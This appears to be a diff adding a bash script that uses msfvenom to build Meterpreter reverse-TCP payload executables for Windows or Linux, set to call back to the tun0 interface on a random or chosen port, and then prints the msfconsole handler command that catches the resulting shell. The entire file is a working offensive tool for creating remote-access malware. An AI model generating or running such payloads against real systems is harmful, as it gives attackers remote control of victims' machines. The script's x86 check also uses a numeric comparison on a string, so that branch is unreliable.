@@ -1,0 +1,72 @@
+#!/bin/bash
+
+PORT=$(shuf -i 4000-5000 -n1)
+OUTPUT="mp"
+
+usage() {
+	echo "$0 <l[inux]|win[dows]> [-a x64|x86]"
+	exit 1
+}
+
+
+platform=$1; shift
+arch="x64"
+while getopts "ha:p:o:" o; do
+    case "${o}" in
+        a)
+            arch=${OPTARG}
+            ;;
+	p)
+	    PORT=${OPTARG}
+	    ;;
+	o)
+	    OUTPUT=${OPTARG}
+	    ;;
+        h | *)
+            usage
+            ;;
+    esac
+done
+shift $((OPTIND-1))
+
+if [ -z "${platform}" ] || [ -z "${arch}" ]; then
+    usage
+fi
+
+generate() {
+  platform=$1
+  arch=$2
+	payload_kind=$3
+	format=$4
+  payload="$platform$payload_kind"
+
+	echo "Generating $platform $arch meterpreter executable for port $PORT."
+	echo "Output: $OUTPUT"
+	msfvenom -a $arch --platform $platform -p "$payload" LHOST=tun0 LPORT=$PORT -f $format -o $OUTPUT
+	echo "msfconsole -x 'use exploit/multi/handler;set payload $payload;set LHOST tun0;set LPORT $PORT;exploit'"
+}
+
+generate_windows() {
+  if [[ $arch -eq 'x86' ]];then
+	  generate "windows" $arch "/meterpreter/reverse_tcp" "exe"
+  else
+	  generate "windows" $arch "/$arch/meterpreter/reverse_tcp" "exe"
+  fi
+}
+
+generate_linux() {
+	generate "linux" $arch "/$arch/meterpreter/reverse_tcp" "elf"
+}
+
+
+case "$platform" in
+	win | windows)
+		generate_windows
+		;;
+	l | linux)
+		generate_linux
+		;;
+  *)
+    usage
+    ;;
+esac
